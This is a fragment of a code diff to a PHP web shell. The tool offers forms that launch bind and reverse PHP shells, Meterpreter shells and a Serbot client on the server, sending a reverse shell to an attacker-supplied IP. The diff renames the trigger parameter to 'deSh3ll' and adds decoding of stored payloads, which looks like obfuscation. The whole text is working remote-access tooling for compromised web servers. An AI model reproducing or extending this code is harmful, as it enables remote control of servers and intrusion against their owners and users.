 	if ($nohup == True)
 	{
 		$command = "nohup php '$filename' > /dev/null 2>&1 &";
-		if(evalRel($command)==False)
-		{
-			$phpbindshell = str_replace("<?php", "", $phpbindshell);
-			$phpbindshell = str_replace("?>", "", $phpbindshell);
-			eval($phpbindshell);
-		}
+		evalRel($command);
 	}
 	else
 	{
 		$command = "php '$filename' 2>&1";
-		if(evalRel($command) == False)
-		{
-			$phpbindshell = str_replace("<?php", "", $phpbindshell);
-			$phpbindshell = str_replace("?>", "", $phpbindshell);
-			eval($phpbindshell);
-		}
+		evalRel($command);
 		unlink($filename);
 	}
 }
 
-if(isset($_GET["shell"]) && ($_GET["shell"] == "rps"))
+if(isset($_GET["deSh3ll"]) && ($_GET["deSh3ll"] == "rps"))
 {
 	global $phpreverseshell, $nohup;
 
@@ -3247,6 +2641,7 @@ if(isset($_GET["shell"]) && ($_GET["shell"] == "rps"))
 		$port = 31337;
 	}
 
+	$phpreverseshell = unsh3ll_this($phpreverseshell);
 	$phpreverseshell = str_replace("\$port=4444;", "\$port=$port;", $phpreverseshell);
 	$phpreverseshell = str_replace("\$ipaddr='192.168.1.104';", "\$ipaddr='".$_POST['ip']."';", $phpreverseshell);
 
@@ -3261,31 +2656,21 @@ if(isset($_GET["shell"]) && ($_GET["shell"] == "rps"))
 		$filename = "/tmp/".$filename;
 	}
 
-	file_put_contents($filename, $phpbindshell);
+	file_put_contents($filename, $phpreverseshell);
 	if ($nohup == True)
 	{
 		$command = "nohup php '$filename' > /dev/null 2>&1 &";
-		if(evalRel($command)==False)
-		{
-			$phpbindshell = str_replace("<?php", "", $phpbindshell);
-			$phpbindshell = str_replace("?>", "", $phpbindshell);
-			eval($phpbindshell);
-		}
+		evalRel($command);
 	}
 	else
 	{
 		$command = "php '$filename' 2>&1";
-		if(evalRel($command)==False)
-		{
-			$phpbindshell = str_replace("<?php", "", $phpbindshell);
-			$phpbindshell = str_replace("?>", "", $phpbindshell);
-			eval($phpbindshell);
-		}
+		evalRel($command);
 		unlink($filename);
 	}
 }
 
-if(isset($_GET["shell"]) && ($_GET["shell"] == "bmps"))
+if(isset($_GET["deSh3ll"]) && ($_GET["deSh3ll"] == "bmps"))
 {
 	global $meterpreterbindshell, $nohup;
 
@@ -3305,6 +2690,7 @@ if(isset($_GET["shell"]) && ($_GET["shell"] == "bmps"))
 		$port = 31337;
 	}
 
+	$meterpreterbindshell = unsh3ll_this($meterpreterbindshell);
 	$meterpreterbindshell = str_replace("\$port = 4444;", "\$port = $port;", $meterpreterbindshell);
 	$filename = rand(1,1000) . ".php";
 
@@ -3321,27 +2707,17 @@ if(isset($_GET["shell"]) && ($_GET["shell"] == "bmps"))
 	if ($nohup == True)
 	{
 		$command = "nohup php '$filename' > /dev/null 2>&1 &";
-		if(evalRel($command)==False)
-		{
-			$phpbindshell = str_replace("<?php", "", $phpbindshell);
-			$phpbindshell = str_replace("?>", "", $phpbindshell);
-			eval($phpbindshell);
-		}
+		evalRel($command);
 	}
 	else
 	{
 		$command = "php '$filename' 2>&1";
-		if(evalRel($command)==False)
-		{
-			$phpbindshell = str_replace("<?php", "", $phpbindshell);
-			$phpbindshell = str_replace("?>", "", $phpbindshell);
-			eval($phpbindshell);
-		}
+		evalRel($command);
 		unlink($filename);
 	}
 }
 
-if(isset($_GET["shell"]) && ($_GET["shell"] == "rmps"))
+if(isset($_GET["deSh3ll"]) && ($_GET["deSh3ll"] == "rmps"))
 {
 	global $meterpreterreverseshell, $nohup;
 
@@ -3361,6 +2737,7 @@ if(isset($_GET["shell"]) && ($_GET["shell"] == "rmps"))
 		$port = 31337;
 	}
 
+	$meterpreterreverseshell = unsh3ll_this($meterpreterreverseshell);
 	$meterpreterreverseshell = str_replace("\$port = 4444;", "\$port = $port;", $meterpreterreverseshell);
 	$meterpreterreverseshell = str_replace("\$ip = '192.168.1.104';", "\$ip = '".$_POST['ip']."';", $meterpreterreverseshell);
 	$filename = rand(1,1000) . ".php";
@@ -3378,27 +2755,17 @@ if(isset($_GET["shell"]) && ($_GET["shell"] == "rmps"))
 	if ($nohup == True)
 	{
 		$command = "nohup php '$filename' > /dev/null 2>&1 &";
-		if(evalRel($command)==False)
-		{
-			$phpbindshell = str_replace("<?php", "", $phpbindshell);
-			$phpbindshell = str_replace("?>", "", $phpbindshell);
-			eval($phpbindshell);
-		}
+		evalRel($command);
 	}
 	else
 	{
 		$command = "php '$filename' 2>&1";
-		if(evalRel($command)==False)
-		{
-			$phpbindshell = str_replace("<?php", "", $phpbindshell);
-			$phpbindshell = str_replace("?>", "", $phpbindshell);
-			eval($phpbindshell);
-		}
+		evalRel($command);
 		unlink($filename);
 	}
 }
 
-if(isset($_GET["shell"]) && ($_GET["shell"] == "sc"))
+if(isset($_GET["deSh3ll"]) && ($_GET["deSh3ll"] == "sc"))
 {
 	global $serbotclient, $nohup;
 
@@ -3418,6 +2785,7 @@ if(isset($_GET["shell"]) && ($_GET["shell"] == "sc"))
 		$port = 31337;
 	}
 
+	$serbotclient = unsh3ll_this($serbotclient);
 	$serbotclient = str_replace("port = 4444", "port = $port", $serbotclient);
 	$serbotclient = str_replace("host = \"192.168.1.4\"", "host = \"".$_POST['ip']."\"", $serbotclient);
 	$filename = rand(1,1000) . ".py";
@@ -3449,6 +2817,7 @@ if(isset($_GET["tool"]) && ($_GET["tool"] == "bpscan"))
 {
 	global $bpscan, $nohup;
 
+	$bpscan = unsh3ll_this($bpscan);
 	$bpscan = str_replace("'IP': '127.0.0.1',", "'IP': '".$_SERVER['SERVER_ADDR']."',", $bpscan);
 
 	$filename = "bpscan.py";
@@ -3576,15 +2945,15 @@ else
 }
 ?>
 
-<br><h3><A NAME='Shells' href="#Shells">Shells</A></h3>
+<br><br><h3><A NAME='Shells' href="#Shells">Shells</A></h3>
 
 <?php
 
-if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($eval == True))
+if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True))
 {
 echo "
 <table class='flat-table flat-table-3'>
-		<form action='?shell=bmps#Shells' method='post' >
+		<form action='?deSh3ll=bmps#Shells' method='post' >
 			<tr>
 				<td>Type</td>
 				<td>Bind Meterpreter PHP Shell</td>
@@ -3601,7 +2970,7 @@ echo "
 </table>
 
 <table class='flat-table flat-table-3'>
-		<form action='?shell=rmps#Shells' method='post' >
+		<form action='?deSh3ll=rmps#Shells' method='post' >
 			<tr>
 				<td>Type</td>
 				<td>Reverse Meterpreter PHP Shell</td>
@@ -3622,7 +2991,7 @@ echo "
 </table>
 
 <table class='flat-table flat-table-3'>
-		<form action='?shell=bps#Shells' method='post' >
+		<form action='?deSh3ll=bps#Shells' method='post' >
 			<tr>
 				<td>Type</td>
 				<td>Bind PHP Shell</td>
@@ -3639,7 +3008,7 @@ echo "
 </table>
 
 <table class='flat-table flat-table-3'>
-		<form action='?shell=rps#Shells' method='post' >
+		<form action='?deSh3ll=rps#Shells' method='post' >
 			<tr>
 				<td>Type</td>
 				<td>Reverse PHP Shell</td>
@@ -3660,7 +3029,7 @@ echo "
 </table>
 
 <table class='flat-table flat-table-3'>
-		<form action='?shell=sc#Shells' method='post' >
+		<form action='?deSh3ll=sc#Shells' method='post' >
 			<tr>
 				<td>Type</td>
 				<td>Serbot - Client</td>
@@ -3678,12 +3047,9 @@ echo "
 				<td><input type='submit' value='Start' name='Start'/></td>
 			</tr>
 		</form>
-</table>";
-}
+</table>
 
-if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True))
-{
-echo "
+
 <br><h3><A NAME='Tools' href=\"#Tools\">Tools</A></h3>
 
 <table class='flat-table flat-table-1'>
